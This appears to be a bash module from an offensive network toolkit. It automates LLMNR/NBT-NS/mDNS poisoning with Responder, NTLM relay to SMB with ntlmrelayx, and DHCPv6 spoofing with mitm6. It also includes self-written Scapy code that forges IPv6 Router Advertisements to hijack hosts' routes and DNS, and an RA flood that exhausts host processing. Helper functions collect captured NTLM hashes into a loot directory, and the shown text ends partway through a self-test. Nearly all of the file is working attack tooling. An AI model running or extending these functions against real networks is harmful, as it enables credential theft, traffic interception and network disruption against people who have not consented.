#!/usr/bin/env bash
# 32_resolver_poison.sh — LLMNR / NBT-NS / mDNS poisoning + NTLM relay
# Backends: Responder, impacket-ntlmrelayx, mitm6

: "${WIFISTING_ROOT:=$HOME/wifisting}"
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$WIFISTING_ROOT/loot}"
: "${LOGS_DIR:=$WIFISTING_ROOT/logs}"

RP_DIR="$TMP_DIR/resolver_poison"
RP_LOOT="$LOOT_DIR/resolver_poison"
RP_LOG="$LOGS_DIR/resolver_poison"
RP_PID="$RP_DIR/responder.pid"
RP_RELAY_PID="$RP_DIR/relay.pid"
RP_MITM6_PID="$RP_DIR/mitm6.pid"

mkdir -p "$RP_DIR" "$RP_LOOT" "$RP_LOG"

# ---------- tool detection ----------

rp_find_responder() {
    local c
    for c in \
        "$(command -v responder 2>/dev/null)" \
        "$(command -v Responder.py 2>/dev/null)" \
        /opt/Responder/Responder.py \
        /usr/share/responder/Responder.py \
        /usr/local/bin/Responder.py
    do
        [[ -n "$c" && -x "$c" ]] && { echo "$c"; return 0; }
    done
    return 1
}

rp_responder_root() {
    local bin
    bin="$(rp_find_responder)" || return 1
    dirname "$(readlink -f "$bin")"
}

rp_find_ntlmrelayx() {
    local c
    # Standard PATH
    for c in impacket-ntlmrelayx ntlmrelayx.py; do
        if command -v "$c" >/dev/null 2>&1; then
            echo "$c"; return 0
        fi
    done
    # Common absolute locations
    for c in \
        /usr/local/bin/impacket-ntlmrelayx \
        /usr/bin/impacket-ntlmrelayx \
        /usr/local/bin/ntlmrelayx.py \
        /usr/bin/ntlmrelayx.py \
        "$HOME/.local/bin/impacket-ntlmrelayx" \
        "$HOME/.local/bin/ntlmrelayx.py" \
        /root/.local/bin/impacket-ntlmrelayx \
        /root/.local/bin/ntlmrelayx.py
    do
        [[ -x "$c" ]] && { echo "$c"; return 0; }
    done
    # pipx venvs
    for c in "$HOME/.local/share/pipx/venvs/impacket/bin/impacket-ntlmrelayx" \
             /root/.local/share/pipx/venvs/impacket/bin/impacket-ntlmrelayx; do
        [[ -x "$c" ]] && { echo "$c"; return 0; }
    done
    return 1
}

rp_find_mitm6() {
    local c
    if command -v mitm6 >/dev/null 2>&1; then
        echo "mitm6"; return 0
    fi
    for c in \
        /usr/local/bin/mitm6 \
        /usr/bin/mitm6 \
        "$HOME/.local/bin/mitm6" \
        /root/.local/bin/mitm6 \
        "$HOME/.local/share/pipx/venvs/mitm6/bin/mitm6" \
        /root/.local/share/pipx/venvs/mitm6/bin/mitm6
    do
        [[ -x "$c" ]] && { echo "$c"; return 0; }
    done
    return 1
}

rp_check_tools() {
    local missing=()
    rp_find_responder >/dev/null 2>&1 || missing+=("responder")
    rp_find_ntlmrelayx >/dev/null 2>&1 || missing+=("impacket")
    rp_find_mitm6 >/dev/null 2>&1 || missing+=("mitm6")
    if (( ${#missing[@]} )); then
        printf 'MISSING\t%s\n' "$(IFS=,; echo "${missing[*]}")"
        return 1
    fi
    printf 'READY\n'
}

rp_list_ifaces_tsv() {
    local name ip4
    while read -r name; do
        [[ -z "$name" ]] && continue
        ip4=$(ip -4 addr show "$name" 2>/dev/null | awk '/inet /{print $2}' | head -1)
        printf '%s\t%s\n' "$name" "${ip4:-no-ip}"
    done < <(ls /sys/class/net/ | grep -Ev '^(lo|docker|veth|br-|virbr)')
}

# ---------- status ----------

rp_status_tsv() {
    local running=0 pid="" relay_running=0 relay_pid=""
    local mitm6_running=0 mitm6_pid="" responder_bin="not-found"

    [[ -f "$RP_PID" ]] && {
        pid=$(cat "$RP_PID")
        kill -0 "$pid" 2>/dev/null && running=1
    }
    [[ -f "$RP_RELAY_PID" ]] && {
        relay_pid=$(cat "$RP_RELAY_PID")
        kill -0 "$relay_pid" 2>/dev/null && relay_running=1
    }
    [[ -f "$RP_MITM6_PID" ]] && {
        mitm6_pid=$(cat "$RP_MITM6_PID")
        kill -0 "$mitm6_pid" 2>/dev/null && mitm6_running=1
    }
    responder_bin="$(rp_find_responder 2>/dev/null)" || responder_bin="not-found"

    printf 'running\t%s\n'       "$running"
    printf 'pid\t%s\n'           "$pid"
    printf 'relay_running\t%s\n' "$relay_running"
    printf 'relay_pid\t%s\n'     "$relay_pid"
    printf 'mitm6_running\t%s\n' "$mitm6_running"
    printf 'mitm6_pid\t%s\n'     "$mitm6_pid"
    printf 'responder_bin\t%s\n' "$responder_bin"
    printf 'loot\t%s\n'          "$RP_LOOT"
    printf 'log\t%s\n'           "$RP_LOG"
}

# ---------- Responder ----------

rp_start() {
    local iface="$1" mode="${2:-poison}"
    [[ -z "$iface" ]] && { printf 'ERROR\tmissing iface\n'; return 2; }

    if [[ -f "$RP_PID" ]] && kill -0 "$(cat "$RP_PID")" 2>/dev/null; then
        printf 'ERROR\talready running\n'; return 1
    fi

    local bin
    bin="$(rp_find_responder)" || { printf 'ERROR\tResponder not found\n'; return 1; }

    local -a args=(-I "$iface")
    case "$mode" in
        analyze)     args+=(-A) ;;
        wpad)        args+=(-w -F) ;;
        fingerprint) args+=(-F) ;;
        poison|"")   ;;
        *) printf 'ERROR\tunknown mode: %s\n' "$mode"; return 2 ;;
    esac

    # Direct logs to our loot dir when supported
    if "$bin" --help 2>&1 | grep -q -- '-l '; then
        args+=(-l "$RP_LOG")
    fi

    ( cd "$(rp_responder_root)" 2>/dev/null || cd /tmp; \
      "$bin" "${args[@]}" > "$RP_LOG/responder.out" 2>&1 & \
      echo $! > "$RP_PID" )
    sleep 2

    if kill -0 "$(cat "$RP_PID")" 2>/dev/null; then
        printf 'STARTED\t%s\t%s\n' "$(cat "$RP_PID")" "$mode"
    else
        printf 'ERROR\tfailed to start — check %s\n' "$RP_LOG/responder.out"
        return 1
    fi
}

rp_stop() {
    # Withdraw any Router Advertisement first: an RA left running strands
    # every client with a default route to a host that is not routing.
    [[ -s "$rp_ra_state" ]] && rp_ra_stop >/dev/null 2>&1
    local killed=0 pid=""
    [[ -f "$RP_PID" ]] && pid=$(cat "$RP_PID")

    if [[ -n "$pid" ]]; then
        pkill -P "$pid" 2>/dev/null
        stop_kill_pid "$pid" && killed=1
    fi

    # Poisoning left running is actively network-disruptive, so sweep and
    # verify rather than assuming the pidfile kill worked.
    local sp
    for sp in $(pgrep -f 'Responder.py' 2>/dev/null); do
        [[ "$sp" == "$$" || "$sp" == "$PPID" ]] && continue
        stop_kill_pid "$sp" && killed=1
    done

    if (( killed == 1 )); then
        rm -f "$RP_PID"
        printf 'STOPPED\n'
        return 0
    fi
    if [[ -n "$pid" ]]; then
        printf 'ERROR\tpoisoner pid %s survived SIGKILL (pidfile kept)\n' "$pid" >&2
        return 1
    fi
    printf 'STOPPED\t0\n'
    return 0
}

rp_log_tail() {
    local found=0 dir
    for dir in "$RP_LOG" "$RP_LOOT" \
               "$(rp_responder_root 2>/dev/null)/logs" \
               /opt/Responder/logs /usr/share/responder/logs; do
        [[ -d "$dir" ]] || continue
        local f
        for f in "$dir"/*.txt "$dir"/*.log; do
            [[ -f "$f" ]] || continue
            found=1
            echo "=== $(basename "$f") ==="
            tail -40 "$f"
            echo
        done
    done
    (( found )) || echo "(no logs yet)"
}

# ---------- hash harvesting ----------

rp_sessions_tsv() {
    local dirs=(
        "$RP_LOG"
        "$RP_LOOT"
        "$(rp_responder_root 2>/dev/null)/logs"
        /opt/Responder/logs
        /usr/share/responder/logs
    )
    local dir file line host
    for dir in "${dirs[@]}"; do
        [[ -d "$dir" ]] || continue
        for file in "$dir"/*.txt; do
            [[ -f "$file" ]] || continue
            host=$(basename "$file" .txt)
            while IFS= read -r line; do
                [[ "$line" == *"::"* ]] || continue
                printf '%s\t%s\n' "$host" "$line"
            done < "$file"
        done
    done
}

# ---------- NTLM relay ----------

rp_relay_start() {
    local target="$1" port="${2:-445}"
    [[ -z "$target" ]] && { printf 'ERROR\ttarget required\n'; return 2; }

    if [[ -f "$RP_RELAY_PID" ]] && kill -0 "$(cat "$RP_RELAY_PID")" 2>/dev/null; then
        printf 'ERROR\trelay already running\n'; return 1
    fi

    local ntlmrelayx
    ntlmrelayx="$(rp_find_ntlmrelayx)" || {
        printf 'ERROR\tntlmrelayx not found\n'; return 1
    }

    local -a args=(-t "smb://$target:$port" -smb2support -of "$RP_LOOT/relayed")

    ( "$ntlmrelayx" "${args[@]}" > "$RP_LOG/relay.out" 2>&1 & \
      echo $! > "$RP_RELAY_PID" )
    sleep 1

    if kill -0 "$(cat "$RP_RELAY_PID")" 2>/dev/null; then
        printf 'STARTED\t%s\t%s\n' "$(cat "$RP_RELAY_PID")" "$target"
    else
        printf 'ERROR\trelay failed to start — check %s\n' "$RP_LOG/relay.out"
        return 1
    fi
}

rp_relay_stop() {
    local killed=0 pid=""
    [[ -f "$RP_RELAY_PID" ]] && pid=$(cat "$RP_RELAY_PID")
    if [[ -n "$pid" ]]; then
        stop_kill_pid "$pid" && killed=1
    fi
    stop_sweep 'ntlmrelayx' && killed=1
    if (( killed == 1 )); then
        rm -f "$RP_RELAY_PID"
        printf 'STOPPED\n'
        return 0
    fi
    if [[ -n "$pid" ]]; then
        printf 'ERROR\trelay pid %s survived SIGKILL (pidfile kept)\n' "$pid" >&2
        return 1
    fi
    printf 'STOPPED\n'
}

rp_relay_log() {
    [[ -f "$RP_LOG/relay.out" ]] && tail -60 "$RP_LOG/relay.out"
    return 0
}

# ---------- mitm6 ----------

rp_mitm6_start() {
    local domain="$1" iface="${2:-}"
    [[ -z "$domain" ]] && { printf 'ERROR\tdomain required\n'; return 2; }

    if [[ -f "$RP_MITM6_PID" ]] && kill -0 "$(cat "$RP_MITM6_PID")" 2>/dev/null; then
        printf 'ERROR\tmitm6 already running\n'; return 1
    fi

    local mitm6_bin
    mitm6_bin="$(rp_find_mitm6)" || {
        printf 'ERROR\tmitm6 not found\n'; return 1
    }

    local -a args=(-d "$domain")
    [[ -n "$iface" ]] && args+=(-i "$iface")

    ( "$mitm6_bin" "${args[@]}" > "$RP_LOG/mitm6.out" 2>&1 & \
      echo $! > "$RP_MITM6_PID" )
    sleep 1

    if kill -0 "$(cat "$RP_MITM6_PID")" 2>/dev/null; then
        printf 'STARTED\t%s\t%s\n' "$(cat "$RP_MITM6_PID")" "$domain"
    else
        printf 'ERROR\tmitm6 failed to start\n'
        return 1
    fi
}

rp_mitm6_stop() {
    local killed=0 pid=""
    [[ -f "$RP_MITM6_PID" ]] && pid=$(cat "$RP_MITM6_PID")
    if [[ -n "$pid" ]]; then
        stop_kill_pid "$pid" && killed=1
    fi
    stop_sweep 'mitm6' && killed=1
    if (( killed == 1 )); then
        rm -f "$RP_MITM6_PID"
        printf 'STOPPED\n'
        return 0
    fi
    if [[ -n "$pid" ]]; then
        printf 'ERROR\tmitm6 pid %s survived SIGKILL (pidfile kept)\n' "$pid" >&2
        return 1
    fi
    printf 'STOPPED\n'
}

rp_mitm6_log() {
    [[ -f "$RP_LOG/mitm6.out" ]] && tail -60 "$RP_LOG/mitm6.out"
    return 0
}

# ---------- combined poison + relay ----------

rp_poison_relay() {
    local iface="$1" target="$2"
    [[ -z "$iface" || -z "$target" ]] && {
        printf 'ERROR\tusage: --poison-relay IFACE TARGET\n'; return 2
    }
    rp_start "$iface" poison || return 1
    sleep 1
    rp_relay_start "$target" || { rp_stop; return 1; }
    printf 'READY\t%s\t%s\n' "$iface" "$target"
}

# ---------- interactive menu ----------

# ── Router Advertisement / SLAAC takeover ─────────────────────────────
#
# The fourth technique, alongside Responder, ntlmrelayx and mitm6.
#
# mitm6 does DHCPv6 and deliberately does not do Router Advertisements.
# That leaves a hole: on a network with no DHCPv6 in play, mitm6 has
# nothing to answer, while a forged RA still reconfigures every host on
# the link - new default route, new prefix, and via RDNSS a new resolver.
# There is no authentication in SLAAC, so nothing has to be tricked.
#
# The failure mode is worse than the other three: an RA left running
# strands every client with a default route to a host that is not
# routing, and they stay broken after you leave. rp_stop therefore sends
# a withdrawal with a zero router lifetime BEFORE tearing down, so hosts
# drop the route deliberately rather than ageing it out.

rp_ra_pid="$RP_DIR/ra.pid"
rp_ra_state="$RP_DIR/ra.state"

rp_ra_mac() { cat "/sys/class/net/$1/address" 2>/dev/null; }

# Modified EUI-64 link-local. A router must source its RA from a
# link-local address; a global or unspecified source is dropped unread.
rp_ra_linklocal() {
    local mac="$1" b i h1 h2 h3 h4
    IFS=':' read -r -a b <<< "$mac"
    # printf %x takes a NUMBER and the MAC arrives as hex text, so every
    # octet is converted first. Passing "ec" through makes printf treat it
    # as bad decimal and emit 00.
    for i in 0 1 2 3 4 5; do
        b[$i]=$(( 0x${b[$i]:-0} ))
    done
    b[0]=$(( b[0] ^ 0x02 ))          # flip the universal/local bit
    # Build hextets as numbers so the output is canonical: emitting each
    # octet with %02x pads to 0200 where the address is 200.
    h1=$(( (b[0] << 8) | b[1] ))
    h2=$(( (b[2] << 8) | 0xff ))
    h3=$(( 0xfe00 | b[3] ))
    h4=$(( (b[4] << 8) | b[5] ))
    printf 'fe80::%x:%x:%x:%x' "$h1" "$h2" "$h3" "$h4"
}

rp_ra_iface() {
    local i="${1:-${MON_IFACE:-}}"
    [[ -z "$i" && -f "$TMP_DIR/mon_iface" ]] && i=$(cat "$TMP_DIR/mon_iface")
    printf '%s' "$i"
}

rp_ra_require() {
    local i="$1"
    [[ -z "$i" ]] && {
        printf 'ERROR\tno interface given\n' >&2
        printf 'ERROR\tgive one explicitly, or enable one in Interface Manager\n' >&2
        return 1
    }
    [[ -e "/sys/class/net/$i" ]] || {
        printf 'ERROR\t%s does not exist\n' "$i" >&2; return 1; }
    # Receiving in monitor mode is not enough: an RA a client will accept
    # has to come from a managed interface on the link.
    local t
    t=$(iw dev "$i" info 2>/dev/null | awk '/type/{print $2}')
    if [[ "$t" == "monitor" ]]; then
        printf 'ERROR\t%s is in monitor mode\n' "$i" >&2
        printf 'ERROR\tan RA must be sent from a managed interface\n' >&2
        return 1
    fi
    local v
    v=$(cat "/proc/sys/net/ipv6/conf/$i/disable_ipv6" 2>/dev/null)
    [[ "$v" == "0" ]] || {
        printf 'ERROR\tIPv6 is disabled on %s\n' "$i" >&2
        printf 'ERROR\tsysctl net.ipv6.conf.%s.disable_ipv6=0\n' "$i" >&2
        return 1
    }
    printf '%s' "$i"
}

rp_ra_forwarding() {
    local i="$1" want="$2" cur
    cur=$(cat "/proc/sys/net/ipv6/conf/$i/forwarding" 2>/dev/null)
    if [[ "$cur" != "$want" ]]; then
        sysctl -qw "net.ipv6.conf.$i.forwarding=$want" 2>/dev/null
        printf 'FORWARDING\t%s\t%s -> %s\n' "$i" "${cur:-?}" "$want"
    fi
}

# One RA. Scapy rather than radvd: radvd is a daemon with a config file
# and its own timing, whereas here lifetime, preference and RDNSS are
# arguments and a withdrawal is the same packet with a zero lifetime.
rp_ra_emit() {
    local iface="$1" prefix="$2" dns="$3" lifetime="$4" pref="$5" count="${6:-1}"
    python3 - "$iface" "$prefix" "$dns" "$lifetime" "$pref" "$count" <<'PY'
import sys
from scapy.all import (Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo,
                       ICMPv6NDOptRDNSS, ICMPv6NDOptSrcLLAddr, sendp, conf)
iface, prefix, dns, lifetime, pref, count = sys.argv[1:7]
lifetime, count, pref = int(lifetime), int(count), int(pref)
conf.verb = 0
mac = open("/sys/class/net/%s/address" % iface).read().strip()
b = [int(x, 16) for x in mac.split(":")]
b[0] ^= 0x02
ll = "fe80::%x:%x:%x:%x" % ((b[0] << 8) | b[1], (b[2] << 8) | 0xff,
                           0xfe00 | b[3], (b[4] << 8) | b[5])
pkt = (Ether(dst="33:33:00:00:00:01", src=mac) /
       IPv6(src=ll, dst="ff02::1", hlim=255) /
       ICMPv6ND_RA(chlim=64, routerlifetime=lifetime, prf=pref) /
       ICMPv6NDOptSrcLLAddr(lladdr=mac))
if prefix:
    pkt = pkt / ICMPv6NDOptPrefixInfo(
        prefix=prefix, prefixlen=64,
        validlifetime=max(lifetime, 7200),
        preferredlifetime=max(lifetime, 3600), L=1, A=1)
if dns:
    pkt = pkt / ICMPv6NDOptRDNSS(dns=[dns], lifetime=max(lifetime, 600))
sendp(pkt, iface=iface, count=count, inter=0.3, verbose=0)
print("SENT\t%d RA(s) ll=%s lifetime=%d prf=%d" % (count, ll, lifetime, pref))
PY
}

rp_ra_start() {
    local iface="" prefix="" dns="" lifetime=1800 pref=1 duration=""
    # Distinguish "no argument" from "an empty argument": only the former
    # should fall back to the configured interface.
    if (( $# >= 1 )); then iface="$1"; else iface=$(rp_ra_iface); fi

    local n=2
    while (( n <= $# )); do
        case "${!n}" in
            --prefix)   prefix="${!#}" ;;
            --dns)      dns="${!#}" ;;
            --lifetime) lifetime="${!#}" ;;
            --low)      pref=3 ;;
            --duration) duration="${!#}" ;;
        esac
        n=$(( n + 1 ))
    done

    # Validate the invocation before the hardware: a bad prefix is a bad
    # prefix, not a missing interface.
    [[ -z "$prefix" ]] && {
        printf 'ERROR\tno prefix given - hosts need one to configure an address\n' >&2
        printf 'ERROR\tuse --prefix fd00:dead:beef:: to hand out a ULA\n' >&2
        return 2
    }
    [[ "$prefix" =~ ^[0-9a-fA-F:]+$ ]] || {
        printf 'ERROR\t%s is not an IPv6 prefix\n' "$prefix" >&2; return 1; }

    rp_responder_root || return 1
    rp_ra_require "$iface" >/dev/null || return 1

    printf 'TECHNIQUE\trouter advertisement\n'
    printf 'IFACE\t%s\n' "$iface"
    printf 'PREFIX\t%s/64\n' "$prefix"
    printf 'RDNSS\t%s\n' "${dns:-unchanged}"
    printf 'LIFETIME_S\t%s\n' "$lifetime"
    printf 'NOTE\tevery host on the segment accepts this; SLAAC is unauthenticated\n'

    # Be a router before claiming to be one. Advertising without
    # forwarding strands the clients we just reconfigured.
    rp_ra_forwarding "$iface" 1
    # Stop our own kernel adopting what we advertise, or this host loses
    # its route when the attack ends.
    sysctl -qw "net.ipv6.conf.$iface.accept_ra=0" 2>/dev/null
    sysctl -qw "net.ipv6.conf.$iface.accept_ra_defrtr=0" 2>/dev/null

    if [[ -n "$duration" ]]; then
        setsid bash -c '
            end=$(( $(date +%s) + '"$duration"' ))
            while (( $(date +%s) < end )); do
                "'"$SELF"'" --ra-spoof "'"$iface"'" --prefix "'"$prefix"'" \
                    --dns "'"$dns"'" --lifetime '"$lifetime"' >/dev/null 2>&1
                sleep 5
            done
            "'"$SELF"'" --ra-stop >/dev/null 2>&1
        ' > "$RP_DIR/ra.log" 2>&1 &
        echo $! > "$rp_ra_pid"
        printf 'PID\t%s\n' "$(cat "$rp_ra_pid")"
        printf 'DURATION_S\t%s\n' "$duration"
    else
        rp_ra_emit "$iface" "$prefix" "$dns" "$lifetime" "$pref" 3
    fi
    printf '%s\t%s\t%s\n' "$(date +%s)" "$iface" "$prefix" >> "$rp_ra_state"
}

rp_ra_flood() {
    local iface="" count="${2:-200}"
    if (( $# >= 1 )); then iface="$1"; else iface=$(rp_ra_iface); fi
    rp_responder_root || return 1
    rp_ra_require "$iface" >/dev/null || return 1
    printf 'TECHNIQUE\tRA flood\n'
    printf 'IFACE\t%s\n' "$iface"
    printf 'COUNT\t%s\n' "$count"
    printf 'NOTE\tthis does not redirect - it exhausts host RA processing\n'
    python3 - "$iface" "$count" <<'PY'
import sys
from scapy.all import (Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo,
                       ICMPv6NDOptSrcLLAddr, sendp, conf)
iface, count = sys.argv[1], int(sys.argv[2])
conf.verb = 0
mac = open("/sys/class/net/%s/address" % iface).read().strip()
b = [int(x, 16) for x in mac.split(":")]
b[0] ^= 0x02
ll = "fe80::%x:%x:%x:%x" % ((b[0] << 8) | b[1], (b[2] << 8) | 0xff,
                           0xfe00 | b[3], (b[4] << 8) | b[5])
for i in range(count):
    sendp(Ether(dst="33:33:00:00:00:01", src=mac) /
          IPv6(src=ll, dst="ff02::1", hlim=255) /
          ICMPv6ND_RA(chlim=64, routerlifetime=1800, prf=1) /
          ICMPv6NDOptSrcLLAddr(lladdr=mac) /
          ICMPv6NDOptPrefixInfo(prefix="fd00:%x::" % (i & 0xffff), prefixlen=64,
                                validlifetime=7200, preferredlifetime=3600,
                                L=1, A=1), iface=iface, verbose=0)
print("SENT\t%d RA(s) with rotating prefixes" % count)
PY
}

rp_ra_stop() {
    local rc=0
    printf 'WITHDRAW\tsending lifetime-0 RA before teardown\n'
    # Order matters: withdraw while forwarding is still on and the link is
    # still up, so clients drop the route deliberately instead of ageing
    # it out over the next half hour.
    if [[ -s "$rp_ra_state" ]]; then
        local t iface
        while IFS=$'\t' read -r t iface _rest; do
            [[ -z "$iface" || ! -e "/sys/class/net/$iface" ]] && continue
            rp_ra_emit "$iface" "" "" 0 3 3 >/dev/null 2>&1 && rc=$(( rc + 1 ))
            printf 'WITHDRAWN\t%s\n' "$iface"
            rp_ra_forwarding "$iface" 0
            sysctl -qw "net.ipv6.conf.$iface.accept_ra=1" 2>/dev/null
        done < <(sort -u -k2,2 "$rp_ra_state")
    else
        printf 'WITHDRAWN\tnothing to withdraw\n'
    fi
    [[ -f "$rp_ra_pid" ]] && { kill "$(cat "$rp_ra_pid")" 2>/dev/null && rc=$(( rc + 1 )); rm -f "$rp_ra_pid"; }
    # Match the spawned emitter specifically: a bare pattern also matches
    # this script's own path and would kill the selftest.
    pkill -f 'resolver_poison.*--ra-spoof' 2>/dev/null && rc=$(( rc + 1 ))
    : > "$rp_ra_state"
    printf 'STOPPED\t%s\n' "$rc"
}

rp_ra_status() {
    local i pid running=0
    i=$(rp_ra_iface)
    [[ -f "$rp_ra_pid" ]] && pid=$(cat "$rp_ra_pid" 2>/dev/null)
    [[ -n "$pid" && -d "/proc/$pid" ]] && running=1
    printf 'ra_running\t%s\n' "$running"
    printf 'ipv6_forwarding\t%s\n' "$(cat "/proc/sys/net/ipv6/conf/$i/forwarding" 2>/dev/null || echo -)"
    printf 'ipv6_disabled\t%s\n' "$(cat "/proc/sys/net/ipv6/conf/$i/disable_ipv6" 2>/dev/null || echo -)"
    printf 'withdrawals_pending\t%s\n' "$( [[ -s "$rp_ra_state" ]] && wc -l < "$rp_ra_state" || echo 0)"
}

rp_menu() {
    while true; do
        banner 2>/dev/null || clear
        echo -e "  ${C_MAG:-}=== Resolver Poison ===${C_RESET:-}"
        rp_status_tsv 2>/dev/null | awk -F'\t' '{printf "  %-16s %s\n",$1":",$2}'
        cat << 'M'

  [1]  check tools
  [2]  list interfaces
  [3]  start Responder (poison mode)
  [4]  start Responder (analyze mode)
  [5]  start Responder (WPAD mode)
  [6]  stop Responder
  [7]  tail Responder log
  [8]  list captured hashes
  ---- NTLM relay ----
  [r]  start ntlmrelayx
  [R]  stop ntlmrelayx
  [l]  relay log
  ---- mitm6 ----
  [m]  start mitm6
  [M]  stop mitm6
  [n]  mitm6 log
  ----
  [0]  back

M
        read -rp "  choice> " c
        case "$c" in
            1) rp_check_tools; read -rp "  enter> " _ ;;
            2) rp_list_ifaces_tsv | column -t -s $'\t'; read -rp "  enter> " _ ;;
            3) read -rp "  iface> " i; rp_start "$i" poison; read -rp "  enter> " _ ;;
            4) read -rp "  iface> " i; rp_start "$i" analyze; read -rp "  enter> " _ ;;
            5) read -rp "  iface> " i; rp_start "$i" wpad; read -rp "  enter> " _ ;;
            6) rp_stop; read -rp "  enter> " _ ;;
            7) rp_log_tail; read -rp "  enter> " _ ;;
            8) rp_sessions_tsv | head -40; read -rp "  enter> " _ ;;
            r) read -rp "  target host> " t; rp_relay_start "$t"; read -rp "  enter> " _ ;;
            R) rp_relay_stop; read -rp "  enter> " _ ;;
            l) rp_relay_log; read -rp "  enter> " _ ;;
            m) read -rp "  domain> " d; read -rp "  iface (blank=auto)> " i
               rp_mitm6_start "$d" "$i"; read -rp "  enter> " _ ;;
            M) rp_mitm6_stop; read -rp "  enter> " _ ;;
            n) rp_mitm6_log; read -rp "  enter> " _ ;;
            0) return ;;
            *) echo "?"; sleep 0.3 ;;
        esac
    done
}

# ---------- CLI dispatch ----------

# ── verified stop ──
# Kill one pid with escalating signals; returns 0 ONLY once it is gone.
# Every stop path below uses this so a failed kill is reported instead of
# printing STOPPED and deleting the pidfile that was the only handle to it.
stop_kill_pid() {
    local pid="$1" i
    # Liveness via /proc, NOT `kill -0`: for a root-owned process we get EPERM,
    # and treating that as "gone" made stops report success while nothing died.
    [[ -d "/proc/$pid" ]] || return 0
    kill -INT  "-$pid" 2>/dev/null || kill -INT  "$pid" 2>/dev/null
    for i in 1 2 3 4 5 6 7 8 9 10; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -TERM "-$pid" 2>/dev/null || kill -TERM "$pid" 2>/dev/null
    for i in 1 2 3 4 5; do
        [[ -d "/proc/$pid" ]] || return 0
        sleep 0.2
    done
    kill -KILL "-$pid" 2>/dev/null || kill -KILL "$pid" 2>/dev/null
    sleep 0.3
    [[ -d "/proc/$pid" ]] && return 1
    return 0
}
# Kill everything matching a pgrep -f pattern, never this shell or its parent.
stop_sweep() {
    local pat="$1" sp rs=0 any=0
    # Exclude this process AND its whole ancestor chain. Excluding only $$ and
    # $PPID is not enough: when invoked via `timeout` or pkexec the caller's
    # shell is further up, and a cmdline substring match would kill it — a
    # pattern like "mitm6" matches the very command line running this stop.
    local -A _skip=()
    sp=$$
    while [[ -n "$sp" && "$sp" != "0" && "$sp" != "1" ]]; do
        _skip[$sp]=1
        sp=$(ps -o ppid= -p "$sp" 2>/dev/null | tr -d ' ')
        [[ -z "$sp" ]] && break
    done
    for sp in $(pgrep -f "$pat" 2>/dev/null); do
        [[ -n "${_skip[$sp]:-}" ]] && continue
        any=1
        stop_kill_pid "$sp" || rs=1
    done
    (( any )) && return $rs
    return 0
}

# ── self-test ────────────────────────────────────────────────────────────
# Nothing here starts a poisoner or opens a socket: the pidfile state
# machine, the captured-hash reader, the tool-presence report and every
# argument-validation path are all file/argv logic. Pidfiles and log dirs
# are redirected into scratch space so live loot and logs are untouched.
rp_selftest() {
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }
    fld() { printf '%s\n' "$1" | awk -F'\t' -v k="$2" '$1==k{print $2; exit}'; }
    rcount() { printf '%s\n' "$1" | grep -c . ; }

    local MOD_TMP="$RP_DIR/selftest"
    rm -rf "$MOD_TMP"; mkdir -p "$MOD_TMP/logs" "$MOD_TMP/loot"
    local s_pid="$RP_PID" s_rpid="$RP_RELAY_PID" s_mpid="$RP_MITM6_PID"
    local s_log="$RP_LOG" s_loot="$RP_LOOT"
    RP_PID="$MOD_TMP/responder.pid"
    RP_RELAY_PID="$MOD_TMP/relay.pid"
    RP_MITM6_PID="$MOD_TMP/mitm6.pid"
    RP_LOG="$MOD_TMP/logs"
    RP_LOOT="$MOD_TMP/loot"

    local out rc dead
    dead=$(cat /proc/sys/kernel/pid_max 2>/dev/null || echo 4194304)

    # 1. status with no pidfiles at all
    out=$(rp_status_tsv)
    chk status-rows       "$(rcount "$out")" 9
    chk status-fields     "$(printf '%s\n' "$out" | awk -F'\t' 'NF!=2{c++} END{print c+0}')" 0
    chk status-idle-main  "$(fld "$out" running)"       0
    chk status-idle-pid   "$(fld "$out" pid)"           ""
    chk status-idle-relay "$(fld "$out" relay_running)" 0
    chk status-idle-mitm6 "$(fld "$out" mitm6_running)" 0
    chk status-loot       "$(fld "$out" loot)"          "$RP_LOOT"
    chk status-log        "$(fld "$out" log)"           "$RP_LOG"

    # 2. live holder (this shell) is reported as running
    printf '%s\n' "$$" > "$RP_PID"
    printf '%s\n' "$$" > "$RP_RELAY_PID"
    printf '%s\n' "$$" > "$RP_MITM6_PID"
    out=$(rp_status_tsv)
    chk status-live-main  "$(fld "$out" running)"       "1"
    chk status-live-pid   "$(fld "$out" pid)"           "$$"
    chk status-live-relay "$(fld "$out" relay_running)" "1"
    chk status-live-mitm6 "$(fld "$out" mitm6_running)" "1"

    # 3. a stale pidfile is "not running" but still reports the pid it held
    printf '%s\n' "$dead" > "$RP_PID"
    rm -f "$RP_RELAY_PID" "$RP_MITM6_PID"
    out=$(rp_status_tsv)
    chk status-stale-main "$(fld "$out" running)" 0
    chk status-stale-pid  "$(fld "$out" pid)"     "$dead"
